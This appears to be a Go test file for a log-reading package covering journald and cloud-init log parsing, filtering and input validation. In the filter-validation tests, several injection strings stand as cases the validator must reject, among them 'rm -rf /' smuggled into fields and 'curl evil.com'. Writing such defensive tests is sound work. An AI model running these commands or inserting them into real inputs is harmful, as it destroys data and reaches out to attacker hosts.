package logreader

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestParseJournalJSON(t *testing.T) {
	input := `{"__REALTIME_TIMESTAMP":"1708700000000000","MESSAGE":"test message","PRIORITY":"6","__CURSOR":"s=abc123","_SYSTEMD_UNIT":"vm-agent.service"}
{"__REALTIME_TIMESTAMP":"1708700001000000","MESSAGE":"error occurred","PRIORITY":"3","__CURSOR":"s=def456","_SYSTEMD_UNIT":"vm-agent.service"}
`
	entries, cursor := parseJournalJSON(input, "agent")

	if len(entries) != 2 {
		t.Fatalf("expected 2 entries, got %d", len(entries))
	}

	if entries[0].Level != "info" {
		t.Errorf("entry[0].Level = %q, want %q", entries[0].Level, "info")
	}
	if entries[0].Message != "test message" {
		t.Errorf("entry[0].Message = %q, want %q", entries[0].Message, "test message")
	}
	if entries[0].Source != "agent" {
		t.Errorf("entry[0].Source = %q, want %q", entries[0].Source, "agent")
	}

	if entries[1].Level != "error" {
		t.Errorf("entry[1].Level = %q, want %q", entries[1].Level, "error")
	}
	if entries[1].Message != "error occurred" {
		t.Errorf("entry[1].Message = %q, want %q", entries[1].Message, "error occurred")
	}

	if cursor == nil {
		t.Fatal("cursor should not be nil")
	}
	if *cursor != "s=def456" {
		t.Errorf("cursor = %q, want %q", *cursor, "s=def456")
	}
}

func TestParseJournalJSON_DockerSource(t *testing.T) {
	input := `{"__REALTIME_TIMESTAMP":"1708700000000000","MESSAGE":"container log","PRIORITY":"6","__CURSOR":"s=abc","CONTAINER_NAME":"ws-abc123-devcontainer"}
`
	entries, _ := parseJournalJSON(input, "docker")

	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].Source != "docker:ws-abc123-devcontainer" {
		t.Errorf("source = %q, want %q", entries[0].Source, "docker:ws-abc123-devcontainer")
	}
}

func TestParseJournalJSON_EmptyInput(t *testing.T) {
	entries, cursor := parseJournalJSON("", "agent")
	if len(entries) != 0 {
		t.Errorf("expected 0 entries, got %d", len(entries))
	}
	if cursor != nil {
		t.Errorf("cursor should be nil for empty input")
	}
}

func TestParseJournalJSON_InvalidJSON(t *testing.T) {
	input := "not json\n{\"MESSAGE\":\"valid\"}\n"
	entries, _ := parseJournalJSON(input, "agent")
	// Should skip invalid line and parse valid one
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].Message != "valid" {
		t.Errorf("message = %q, want %q", entries[0].Message, "valid")
	}
}

func TestPriorityToLevel(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"0", "error"},
		{"1", "error"},
		{"2", "error"},
		{"3", "error"},
		{"4", "warn"},
		{"5", "info"},
		{"6", "info"},
		{"7", "debug"},
		{"", "info"},
		{"99", "info"},
	}
	for _, tt := range tests {
		got := priorityToLevel(tt.input)
		if got != tt.want {
			t.Errorf("priorityToLevel(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestFilterByLevel(t *testing.T) {
	entries := []LogEntry{
		{Level: "debug", Message: "debug msg"},
		{Level: "info", Message: "info msg"},
		{Level: "warn", Message: "warn msg"},
		{Level: "error", Message: "error msg"},
	}

	tests := []struct {
		level string
		want  int
	}{
		{"debug", 4},
		{"info", 3},
		{"warn", 2},
		{"error", 1},
	}

	for _, tt := range tests {
		result := filterByLevel(entries, tt.level)
		if len(result) != tt.want {
			t.Errorf("filterByLevel(%q): got %d entries, want %d", tt.level, len(result), tt.want)
		}
	}
}

func TestFilterBySearch(t *testing.T) {
	entries := []LogEntry{
		{Message: "connection refused"},
		{Message: "request completed successfully"},
		{Message: "Connection timeout"},
	}

	result := filterBySearch(entries, "connection")
	if len(result) != 2 {
		t.Errorf("expected 2 matches, got %d", len(result))
	}

	result = filterBySearch(entries, "REFUSED")
	if len(result) != 1 {
		t.Errorf("expected 1 match for case-insensitive, got %d", len(result))
	}

	result = filterBySearch(entries, "nonexistent")
	if len(result) != 0 {
		t.Errorf("expected 0 matches, got %d", len(result))
	}
}

func TestFilterByTimeRange(t *testing.T) {
	entries := []LogEntry{
		{Timestamp: "2026-02-23T10:00:00Z", Message: "early"},
		{Timestamp: "2026-02-23T12:00:00Z", Message: "middle"},
		{Timestamp: "2026-02-23T14:00:00Z", Message: "late"},
	}

	result := filterByTimeRange(entries, "2026-02-23T11:00:00Z", "2026-02-23T13:00:00Z")
	if len(result) != 1 {
		t.Errorf("expected 1 entry in range, got %d", len(result))
	}
	if len(result) > 0 && result[0].Message != "middle" {
		t.Errorf("expected 'middle', got %q", result[0].Message)
	}
}

func TestClampLimit(t *testing.T) {
	// Save and restore defaults
	origDefault := DefaultLimit
	origMax := MaxLimit
	defer func() {
		DefaultLimit = origDefault
		MaxLimit = origMax
	}()

	DefaultLimit = 200
	MaxLimit = 1000

	tests := []struct {
		input int
		want  int
	}{
		{0, 200},
		{-1, 200},
		{50, 50},
		{200, 200},
		{1000, 1000},
		{1001, 1000},
		{5000, 1000},
	}

	for _, tt := range tests {
		got := clampLimit(tt.input)
		if got != tt.want {
			t.Errorf("clampLimit(%d) = %d, want %d", tt.input, got, tt.want)
		}
	}
}

func TestParseCloudInitLog(t *testing.T) {
	// Create temp file with cloud-init style content
	dir := t.TempDir()
	logPath := filepath.Join(dir, "cloud-init.log")

	content := `2026-02-23 15:30:00,123 - module.py - DEBUG - Running module runcmd
2026-02-23 15:30:01,456 - module.py - INFO - Package installation complete
2026-02-23 15:30:02,789 - module.py - WARNING - Retry #2 for apt
2026-02-23 15:30:03,000 - module.py - ERROR - Failed to install package foo
`
	if err := os.WriteFile(logPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	entries, err := parseCloudInitLog(logPath)
	if err != nil {
		t.Fatalf("parseCloudInitLog: %v", err)
	}

	if len(entries) != 4 {
		t.Fatalf("expected 4 entries, got %d", len(entries))
	}

	expectedLevels := []string{"debug", "info", "warn", "error"}
	for i, entry := range entries {
		if entry.Source != "cloud-init" {
			t.Errorf("entry[%d].Source = %q, want %q", i, entry.Source, "cloud-init")
		}
		if entry.Level != expectedLevels[i] {
			t.Errorf("entry[%d].Level = %q, want %q", i, entry.Level, expectedLevels[i])
		}
		if entry.Timestamp == "" {
			t.Errorf("entry[%d].Timestamp should not be empty", i)
		}
	}
}

func TestParseCloudInitLog_NotFound(t *testing.T) {
	_, err := parseCloudInitLog("/nonexistent/path")
	if err == nil {
		t.Error("expected error for nonexistent file")
	}
}

func TestParseCloudInitOutput(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "cloud-init-output.log")

	content := "Installing packages...\nDone.\n"
	if err := os.WriteFile(outPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	entries, err := parseCloudInitOutput(outPath)
	if err != nil {
		t.Fatalf("parseCloudInitOutput: %v", err)
	}

	if len(entries) != 2 {
		t.Fatalf("expected 2 entries, got %d", len(entries))
	}

	for _, entry := range entries {
		if entry.Source != "cloud-init-output" {
			t.Errorf("source = %q, want %q", entry.Source, "cloud-init-output")
		}
		if entry.Level != "info" {
			t.Errorf("level = %q, want %q", entry.Level, "info")
		}
	}
}

func TestJournalPriority(t *testing.T) {
	tests := []struct {
		level string
		want  string
	}{
		{"error", "err"},
		{"warn", "warning"},
		{"debug", "debug"},
		{"info", "info"},
		{"", "info"},
	}
	for _, tt := range tests {
		got := journalPriority(tt.level)
		if got != tt.want {
			t.Errorf("journalPriority(%q) = %q, want %q", tt.level, got, tt.want)
		}
	}
}

func TestNormalizeLevel(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"DEBUG", "debug"},
		{"INFO", "info"},
		{"WARNING", "warn"},
		{"WARN", "warn"},
		{"ERROR", "error"},
		{"CRITICAL", "error"},
		{"UNKNOWN", "info"},
	}
	for _, tt := range tests {
		got := normalizeLevel(tt.input)
		if got != tt.want {
			t.Errorf("normalizeLevel(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// TestReadLogs_WithMockExecutor tests ReadLogs with a mock journalctl.
func TestReadLogs_WithMockExecutor(t *testing.T) {
	mockExec := func(ctx context.Context, name string, args ...string) *exec.Cmd {
		// Return a command that echoes mock journald JSON
		journalLine := `{"__REALTIME_TIMESTAMP":"1708700000000000","MESSAGE":"test log","PRIORITY":"6","__CURSOR":"s=cursor1","_SYSTEMD_UNIT":"vm-agent.service"}`
		return exec.CommandContext(ctx, "echo", journalLine)
	}

	reader := NewReaderWithExecutor(mockExec)
	resp, err := reader.ReadLogs(context.Background(), LogFilter{
		Source: "agent",
		Limit:  10,
	})
	if err != nil {
		t.Fatalf("ReadLogs: %v", err)
	}

	if len(resp.Entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(resp.Entries))
	}
	if resp.Entries[0].Message != "test log" {
		t.Errorf("message = %q, want %q", resp.Entries[0].Message, "test log")
	}
	if resp.Entries[0].Source != "agent" {
		t.Errorf("source = %q, want %q", resp.Entries[0].Source, "agent")
	}
}

func TestReadLogs_CloudInitSource(t *testing.T) {
	// Create temp cloud-init files
	dir := t.TempDir()
	logPath := filepath.Join(dir, "cloud-init.log")
	content := "2026-02-23 15:30:00,123 - module.py - INFO - Test cloud init\n"
	if err := os.WriteFile(logPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	// Override the cloud-init path by using a reader that reads from our temp dir
	// Since readCloudInitLogs uses hardcoded paths, test the parsing directly
	entries, err := parseCloudInitLog(logPath)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if !strings.Contains(entries[0].Message, "Test cloud init") {
		t.Errorf("message should contain 'Test cloud init', got %q", entries[0].Message)
	}
}

func TestBuildFollowArgs(t *testing.T) {
	tests := []struct {
		name   string
		filter LogFilter
		want   []string
	}{
		{
			name:   "agent source",
			filter: LogFilter{Source: "agent"},
			want:   []string{"--follow", "--output=json", "--no-pager", "-n", "0", "-u", "vm-agent.service"},
		},
		{
			name:   "docker with container",
			filter: LogFilter{Source: "docker", Container: "my-container"},
			want:   []string{"--follow", "--output=json", "--no-pager", "-n", "0", "_TRANSPORT=journal", "CONTAINER_NAME=my-container"},
		},
		{
			name:   "all sources",
			filter: LogFilter{Source: "all"},
			want:   []string{"--follow", "--output=json", "--no-pager", "-n", "0"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := buildFollowArgs(tt.filter)
			if len(got) != len(tt.want) {
				t.Errorf("len = %d, want %d\ngot:  %v\nwant: %v", len(got), len(tt.want), got, tt.want)
				return
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("arg[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestJournalEntryToLogEntry(t *testing.T) {
	tests := []struct {
		name   string
		raw    map[string]interface{}
		source string
		want   *LogEntry
	}{
		{
			name: "agent entry",
			raw: map[string]interface{}{
				"__REALTIME_TIMESTAMP": "1708700000000000",
				"MESSAGE":             "test",
				"PRIORITY":            "6",
				"_SYSTEMD_UNIT":       "vm-agent.service",
			},
			source: "agent",
			want: &LogEntry{
				Level:   "info",
				Source:  "agent",
				Message: "test",
			},
		},
		{
			name: "docker entry",
			raw: map[string]interface{}{
				"__REALTIME_TIMESTAMP": "1708700000000000",
				"MESSAGE":             "container log",
				"PRIORITY":            "6",
				"CONTAINER_NAME":      "ws-abc",
			},
			source: "docker",
			want: &LogEntry{
				Level:   "info",
				Source:  "docker:ws-abc",
				Message: "container log",
			},
		},
		{
			name: "empty message returns nil",
			raw: map[string]interface{}{
				"__REALTIME_TIMESTAMP": "1708700000000000",
				"MESSAGE":             "",
				"PRIORITY":            "6",
			},
			source: "agent",
			want:   nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := journalEntryToLogEntry(tt.raw, tt.source)
			if tt.want == nil {
				if got != nil {
					t.Errorf("expected nil, got %+v", got)
				}
				return
			}
			if got == nil {
				t.Fatal("expected non-nil entry")
			}
			if got.Level != tt.want.Level {
				t.Errorf("Level = %q, want %q", got.Level, tt.want.Level)
			}
			if got.Source != tt.want.Source {
				t.Errorf("Source = %q, want %q", got.Source, tt.want.Source)
			}
			if got.Message != tt.want.Message {
				t.Errorf("Message = %q, want %q", got.Message, tt.want.Message)
			}
			if got.Timestamp == "" {
				t.Error("Timestamp should not be empty")
			}
		})
	}
}

// TestStreamCatchUp verifies the catch-up phase with a mock.
func TestStreamCatchUp(t *testing.T) {
	callCount := 0
	mockExec := func(ctx context.Context, name string, args ...string) *exec.Cmd {
		callCount++
		lines := `{"__REALTIME_TIMESTAMP":"1708700000000000","MESSAGE":"line1","PRIORITY":"6","__CURSOR":"c1","_SYSTEMD_UNIT":"vm-agent.service"}
{"__REALTIME_TIMESTAMP":"1708700001000000","MESSAGE":"line2","PRIORITY":"6","__CURSOR":"c2","_SYSTEMD_UNIT":"vm-agent.service"}`
		return exec.CommandContext(ctx, "echo", lines)
	}

	reader := NewReaderWithExecutor(mockExec)
	var received []string
	send := func(entry LogEntry) error {
		received = append(received, entry.Message)
		return nil
	}

	count, err := reader.sendCatchUp(context.Background(), LogFilter{Source: "agent"}, send)
	if err != nil {
		t.Fatalf("sendCatchUp: %v", err)
	}
	if count != 2 {
		t.Errorf("catch-up count = %d, want 2", count)
	}
	// Catch-up should deliver oldest first
	if len(received) != 2 {
		t.Fatalf("received %d entries, want 2", len(received))
	}
	if received[0] != "line2" {
		t.Errorf("first received = %q, want %q (oldest first from reversed)", received[0], "line2")
	}
}

// Ensure env helpers work
func TestEnvInt(t *testing.T) {
	// Default case
	got := envInt("NONEXISTENT_VAR_FOR_TEST", 42)
	if got != 42 {
		t.Errorf("envInt default = %d, want 42", got)
	}

	// Set env
	t.Setenv("TEST_ENV_INT", "99")
	got = envInt("TEST_ENV_INT", 42)
	if got != 99 {
		t.Errorf("envInt from env = %d, want 99", got)
	}

	// Invalid env
	t.Setenv("TEST_ENV_INT_BAD", "notanumber")
	got = envInt("TEST_ENV_INT_BAD", 42)
	if got != 42 {
		t.Errorf("envInt bad value = %d, want 42 (default)", got)
	}
}

func TestValidateFilter(t *testing.T) {
	tests := []struct {
		name    string
		filter  LogFilter
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid empty filter",
			filter:  LogFilter{},
			wantErr: false,
		},
		{
			name:    "valid full filter",
			filter:  LogFilter{Source: "agent", Level: "error", Container: "my-container", Since: "-1h", Until: "2026-02-23T15:00:00Z", Search: "test", Cursor: "s=abc123"},
			wantErr: false,
		},
		{
			name:    "valid relative time since",
			filter:  LogFilter{Since: "-30m"},
			wantErr: false,
		},
		{
			name:    "valid date-only since",
			filter:  LogFilter{Since: "2026-02-23"},
			wantErr: false,
		},
		{
			name:    "valid datetime without tz",
			filter:  LogFilter{Since: "2026-02-23 15:30:00"},
			wantErr: false,
		},
		{
			name:    "invalid source",
			filter:  LogFilter{Source: "malicious"},
			wantErr: true,
			errMsg:  "invalid source",
		},
		{
			name:    "invalid level",
			filter:  LogFilter{Level: "critical"},
			wantErr: true,
			errMsg:  "invalid level",
		},
		{
			name:    "invalid container name with shell chars",
			filter:  LogFilter{Container: "test; rm -rf /"},
			wantErr: true,
			errMsg:  "invalid container name",
		},
		{
			name:    "invalid container name starting with dot",
			filter:  LogFilter{Container: ".hidden"},
			wantErr: true,
			errMsg:  "invalid container name",
		},
		{
			name:    "container name too long",
			filter:  LogFilter{Container: strings.Repeat("a", 256)},
			wantErr: true,
			errMsg:  "container name too long",
		},
		{
			name:    "invalid since with injection",
			filter:  LogFilter{Since: "2026-01-01 && rm -rf /"},
			wantErr: true,
			errMsg:  "invalid since",
		},
		{
			name:    "invalid until with shell metachar",
			filter:  LogFilter{Until: "$(whoami)"},
			wantErr: true,
			errMsg:  "invalid until",
		},
		{
			name:    "invalid cursor with injection",
			filter:  LogFilter{Cursor: "s=abc; curl evil.com"},
			wantErr: true,
			errMsg:  "invalid cursor",
		},
		{
			name:    "cursor too long",
			filter:  LogFilter{Cursor: strings.Repeat("a", 513)},
			wantErr: true,
			errMsg:  "cursor too long",
		},
		{
			name:    "search too long",
			filter:  LogFilter{Search: strings.Repeat("x", 1001)},
			wantErr: true,
			errMsg:  "search string too long",
		},
		{
			name:    "valid search at max length",
			filter:  LogFilter{Search: strings.Repeat("x", 1000)},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateFilter(tt.filter)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error containing %q, got nil", tt.errMsg)
				} else if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error = %q, want containing %q", err.Error(), tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Ensure unused import is kept happy
var _ = time.Now
